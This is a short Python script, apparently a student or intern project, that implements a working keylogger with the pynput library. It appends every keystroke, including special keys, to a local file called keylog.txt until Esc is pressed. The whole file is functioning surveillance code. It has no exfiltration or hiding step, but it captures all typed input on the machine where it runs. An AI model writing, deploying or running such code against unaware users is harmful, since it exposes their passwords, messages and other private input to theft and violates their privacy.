from pynput import keyboard
import os

# Define the log file location
log_file_path = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file_path, "a") as log_file:
        log_file.write(f"{key}")

# Function to handle key press events
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_to_file(' ')
        else:
            write_to_file(f"[{key.name}]")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Main function to start the keylogger
def start_keylogger():
    # Ensure log file exists
    if not os.path.exists(log_file_path):
        with open(log_file_path, "w") as log_file:
            log_file.write("Keylog started\n")

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
#MY name is Nihar an intern in infotech